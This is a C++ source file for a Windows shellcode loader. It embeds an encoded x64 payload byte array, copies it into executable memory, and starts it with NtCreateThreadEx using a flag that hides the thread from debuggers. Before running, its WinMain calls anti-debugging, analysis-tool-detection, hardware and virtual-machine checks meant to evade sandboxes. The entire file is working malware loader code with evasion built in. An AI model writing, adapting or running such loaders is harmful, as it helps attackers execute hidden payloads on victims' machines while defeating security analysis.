#include "CheckHardware.h"
#include "CheckDeviceNames.h"
#include "CheckRunningProcesses.h"
#include "AntiDebugging.h"
#include <Windows.h>
#include "SysCalls.h"

// Stops thread from sending events
#define THREAD_FLAG_HIDE 0x4

void Run()
{
	unsigned char code[] =
		"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x39\x06\x6e\x61\x42\x3c\x3a\xdc\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xc5\x4e\xed"
		"\x85\xb2\xd4\xf6\xdc\x39\x06\x2f\x30\x03\x6c\x68\x8d\x6f"
		"\x4e\x5f\xb3\x27\x74\xb1\x8e\x59\x4e\xe5\x33\x5a\x74\xb1"
		"\x8e\x19\x4e\xe5\x13\x12\x74\x35\x6b\x73\x4c\x23\x50\x8b"
		"\x74\x0b\x1c\x95\x3a\x0f\x1d\x40\x10\x1a\x9d\xf8\xcf\x63"
		"\x20\x43\xfd\xd8\x31\x6b\x4e\xe5\x33\x62\xb7\x78\xe0\x78"
		"\x57\x26\x60\x92\x5a\xbb\xa4\x21\x0d\x6c\x6e\xc7\x4e\x3a"
		"\xdc\x39\x8d\xee\xe9\x42\x3c\x3a\x94\xbc\xc6\x1a\x06\x0a"
		"\x3d\xea\x98\xb2\x46\x4e\x28\x43\xec\x6a\x57\x71\x1e\x8d"
		"\x37\x0a\xc3\xf3\x91\x08\xcf\x2f\xea\x76\xb4\x72\xdd\xef"
		"\x4e\x5f\xa1\x03\xfd\xf3\xd1\x95\x47\x6f\xa0\x7a\xdc\x4f"
		"\x2d\x75\x05\x22\x45\x4a\x79\x03\x0d\x4c\xde\x36\x25\xc9"
		"\x7c\x1e\x95\x38\xd6\x08\x20\xc9\x30\x72\x98\xb2\x46\x72"
		"\x28\x43\xec\x7b\x57\x3d\x8e\x2f\x39\x03\x64\x64\x94\x38"
		"\xd6\x37\x3b\x03\x64\x7b\x85\x78\x5c\x26\xe2\xae\x1c\x7b"
		"\x8e\xc6\xe6\x36\x20\x1b\x66\x72\x57\x2b\xef\x25\x9e\xbd"
		"\xc3\x67\x95\x87\x71\x1d\x53\x1d\x0f\x08\xdc\x39\x47\x38"
		"\x28\xcb\xda\x72\x5d\xd5\xa6\x6f\x61\x42\x75\xb3\x39\x70"
		"\xba\x6c\x61\x53\x60\xfa\x74\x38\x6c\x2f\x35\x0b\xb5\xde"
		"\x90\xb0\xf7\x2f\xdb\x0e\x4b\x1c\xdb\xc6\xd3\x22\xe8\xa8"
		"\x54\x3b\xdd\x39\x06\x37\x20\xf8\x15\xba\xb7\x39\xf9\xbb"
		"\x0b\x48\x7d\x64\x8c\x69\x4b\x5f\xa8\x0f\x0d\xfa\x94\xc6"
		"\xc6\x26\xe8\x80\x74\xc5\x1c\x71\x8f\xaf\x20\xf8\xd6\x35"
		"\x03\xd9\xf9\xbb\x29\xcb\xfb\x50\xcc\x78\x5e\x22\xe8\xa0"
		"\x74\xb3\x25\x78\xbc\xf7\xc4\x36\x5d\xc5\x09\xbc\xc6\x1a"
		"\x6b\x0b\xc3\xf4\xa9\xdc\xee\xfd\x61\x42\x3c\x72\x5f\xd5"
		"\x16\x26\xe8\xa0\x71\x0b\x15\x53\x02\x2f\x39\x0a\xb5\xc3"
		"\x9d\x83\x04\xb7\xa9\x1d\xc3\xef\x5f\xc1\x06\x10\x34\x0a"
		"\xbf\xfe\xfc\x67\x8f\x98\x0b\x02\x7d\x63\xb4\x39\x16\x6e"
		"\x61\x03\x64\x72\x55\xcb\x4e\x5f\xa8\x03\x86\x62\x78\x6a"
		"\xe3\x91\xb4\x0a\xb5\xf9\x95\xb0\xc1\x23\x50\x8b\x75\xb3"
		"\x2c\x71\x8f\xb4\x29\xcb\xc5\x7b\x66\x3b\xdf\xa6\x3e\xbd"
		"\xe9\xb9\x24\x39\x7b\x46\x39\x03\x6b\x63\xb4\x39\x46\x6e"
		"\x61\x03\x64\x50\xdc\x63\x47\xd4\x6a\x6d\x33\x0a\x23\xec"
		"\x51\x37\x20\xf8\x49\x54\x91\x58\xf9\xbb\x28\xbd\xf2\xd3"
		"\xe0\xc6\xf9\x91\x29\x43\xff\x72\xf5\xff\x4e\xeb\x97\x37"
		"\x88\x7b\x23\xde\x5e\x04\x61\x1b\x75\xfd\x1e\xc9\xb3\xcc"
		"\x37\xbd\xe9\x3a\xdc";

	// Correct value
	char first[] = "\x48";

	PVOID pCode = VirtualAlloc(0, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	// Replace bad byte
	RtlCopyMemory(code, first, sizeof first);
	RtlCopyMemory(pCode, code, sizeof code);

	HANDLE hThread;
	HANDLE hProcess = GetCurrentProcess();

	//PVOID pCode = nullptr;
	SIZE_T size = sizeof code;

	//NtAllocateVirtualMemory(hProcess, &pCode, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//NtWriteVirtualMemory(hProcess, pCode, &code, size, nullptr);

	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pCode, 
		NULL, THREAD_FLAG_HIDE, NULL, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{
	IsBeingDebugged();
	AnalysisToolsRunning();
	SystemHasCorrectHardware();
	SystemHasVmDeviceNames();

	Run();
	return 0;
}